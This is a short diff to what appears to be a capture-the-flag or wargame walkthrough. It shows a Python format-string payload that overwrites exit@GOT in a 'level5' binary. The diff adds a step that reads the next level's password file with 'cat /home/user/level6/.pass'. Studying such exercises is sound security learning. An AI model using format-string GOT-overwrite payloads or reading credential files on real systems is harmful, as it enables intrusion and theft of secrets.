@@ -182,6 +182,12 @@ the final to overwrite the exit@GOT with the address of o() is:
 ```bash
 (python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044c" + "%4$hn" + "%31904c" + "%5$hn"'; cat) | ./level5
 ```
+after it complete you will do :
+
+```bash 
+cat /home/user/level6/.pass
+```
+and you will find the pass .
 
 Addresses and format-string writes
 
